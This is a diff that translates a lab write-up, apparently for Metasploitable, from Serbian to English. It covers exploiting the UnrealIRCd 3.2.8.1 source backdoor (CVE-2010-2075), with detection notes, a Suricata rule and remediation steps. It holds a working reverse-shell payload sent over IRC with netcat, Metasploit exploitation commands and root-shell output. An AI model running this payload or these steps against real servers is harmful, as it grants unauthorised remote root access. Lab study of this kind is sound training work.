@@ -1,36 +1,36 @@
 # UnrealIRCd 3.2.8.1 — Backdoor (CVE-2010-2075)
 
-Slično kao kod vsftpd-a, ovde nije reč o grešci u logici servisa nego o
-kompromitovanom izvornom kodu — neko je između novembra 2009. i juna 2010.
-zamenio legitiman UnrealIRCd tarball na zvaničnom download serveru sa
-verzijom koja sadrži backdoor. Svako ko je preuzeo i instalirao taj build
-u tom periodu dobio je server sa ugrađenim daljinskim pristupom.
+Same story as vsftpd: not a logic bug, but poisoned source. Sometime between
+November 2009 and June 2010 someone swapped the legitimate UnrealIRCd tarball on
+the official download server for one carrying a backdoor. Anyone who grabbed and
+built that version in that window ended up with remote access baked into their
+server.
 
-## Cilj
+## Target
 - IP: 192.168.56.102
 - Port: 6667 (IRC)
-- Servis: UnrealIRCd 3.2.8.1
+- Service: UnrealIRCd 3.2.8.1
 
 ## CVE
 CVE-2010-2075
 
-## Tip napada
-Backdoor ubačen u izvorni kod (supply chain kompromitacija)
+## Attack type
+Backdoor planted in the source code (supply chain compromise)
 
 ## MITRE ATT&CK
 - T1190 – Exploit Public-Facing Application
 - T1059 – Command and Scripting Interpreter
 
-## Mehanizam
+## Mechanism
 
-Backdoor kod prepoznaje poruke koje počinju sa `AB;` kao komande — sve što
-sledi posle tog prefiksa izvršava se direktno kao shell komanda na serveru,
-bez ikakve autentifikacije. Dovoljno je poslati tu poruku kroz običnu TCP
-konekciju na port 6667.
+The backdoor treats any message starting with `AB;` as a command. Whatever
+follows that prefix runs directly as a shell command on the server, no auth
+needed. All it takes is sending that message over a plain TCP connection to port
+6667.
 
 ---
 
-## Korak 0: Potvrda servisa
+## Step 0: Confirm the service
 
 ```bash
 nc -nv 192.168.56.102 6667
@@ -38,33 +38,32 @@ nc -nv 192.168.56.102 6667
 
 ![IRC banner](screenshots/03_unrealircd_banner.png)
 
-Server se javlja kao `irc.Metasploitable.LAN`, potvrđujući da IRC servis
-radi na portu 6667. (Konekcija sama pada posle nekog vremena zbog "Ping
-timeout" — obična `nc` sesija ne odgovara na IRC `PING` zahteve, što je
-očekivano i ne utiče na dalji tok.)
+The server answers as `irc.Metasploitable.LAN`, so the IRC service is up on 6667.
+(The connection drops after a while with a "Ping timeout" — a bare `nc` session
+doesn't answer the IRC `PING`, which is expected and doesn't matter here.)
 
 ---
 
-## Metod 1: Ručna eksploatacija
+## Method 1: Manual exploitation
 
-### Korak 1: Pokreni listener
+### Step 1: Start a listener
 
 ```bash
 nc -lvnp 4444
 ```
 
-### Korak 2: Pošalji payload
+### Step 2: Send the payload
 
 ```bash
 echo -e "AB; nc 192.168.56.101 4444 -e /bin/sh" | nc 192.168.56.102 6667
 ```
 
-`AB;` je okidač koji backdoor prepoznaje, a sve posle toga se izvršava kao
-shell komanda — u ovom slučaju šalje reverse shell nazad na listener.
+`AB;` is the trigger the backdoor looks for. Everything after it runs as a shell
+command, which in this case fires a reverse shell back to the listener.
 
-### Rezultat
+### Result
 
-![Root shell preko UnrealIRCd](screenshots/03_unrealircd_root.png)
+![Root shell via UnrealIRCd](screenshots/03_unrealircd_root.png)
 
 whoami → root
 id → uid=0(root) gid=0(root)
@@ -73,9 +72,9 @@ hostname → metasploitable
 
 ---
 
-## Metod 2: Metasploit
+## Method 2: Metasploit
 
-### Komande
+### Commands
 
 ```bash
 msfconsole
@@ -86,9 +85,9 @@ set LHOST 192.168.56.101
 run
 ```
 
-### Rezultat
+### Result
 
-![Metasploit eksploatacija](screenshots/03_unrealircd_metasploit_root.png)
+![Metasploit exploitation](screenshots/03_unrealircd_metasploit_root.png)
 
 [+] The target appears to be vulnerable. UnrealIRCd detected via IRC commands
 [*] Meterpreter session 1 opened
@@ -98,35 +97,30 @@ id → uid=0(root) gid=0(root)
 hostname → metasploitable
 
 
-Meterpreter u ovom slučaju ne prepoznaje `whoami` kao svoju komandu (koristi
-se `getuid` za to), pa je bilo potrebno ući u pravi shell (`shell` komanda)
-da bi se pokrenule standardne Linux komande.
+Meterpreter doesn't take `whoami` as one of its own commands here (that's
+`getuid`), so I had to drop into a real shell with `shell` before the standard
+Linux commands worked.
 
 ---
 
-## Detekcija (blue team ugao)
+## Detection (blue-team view)
 
-- Poruke na IRC portu koje počinju sa `AB;` — ovo nije deo standardnog IRC
-  protokola i lako je prepoznatljivo pattern matching-om
-- Odlazna konekcija sa IRC servera ka eksternom IP-u i portu, tipično za
-  reverse shell
-- Proces poput `nc` ili `bash` koji se spawn-uje iz IRC daemona — jasna
-  anomalija u process tree-u
-- Novoregistrovan IRC korisnik praćen odmah spawn-ovanim shell procesom
+- Messages on the IRC port that start with `AB;`. That's not part of normal IRC, and pattern matching picks it out easily.
+- An outbound connection from the IRC server to an external IP and port, which is the reverse shell.
+- A process like `nc` or `bash` spawning out of the IRC daemon. Odd one out in the process tree.
+- A freshly registered IRC user immediately followed by a spawned shell process.
 
-## IDS potpis (Suricata primer)
+## IDS signature (Suricata example)
 
 alert tcp any any -> any 6667 (msg:"UnrealIRCd backdoor command attempt"; content:"AB;"; sid:9000003;)
 
 
-## Remedijacija
+## Remediation
 
-- Nikada ne koristiti UnrealIRCd 3.2.8.1 — proveriti checksum preuzetog
-  paketa pre instalacije, koristiti samo zvanične, potpisane repo-e
-- Upgrade na verziju bez backdoor-a
-- Firewall pravilo koje ograničava pristup IRC portu samo na poverljive IP
-  adrese
-- Monitoring neuobičajenog sadržaja u IRC saobraćaju
+- Don't run UnrealIRCd 3.2.8.1. Check the checksum of anything you download before building it, and stick to official, signed repos.
+- Upgrade to a version without the backdoor.
+- A firewall rule that limits the IRC port to trusted IPs only.
+- Watch for unusual content in IRC traffic.
 
 ## Screenshots
 - `03_unrealircd_banner.png`
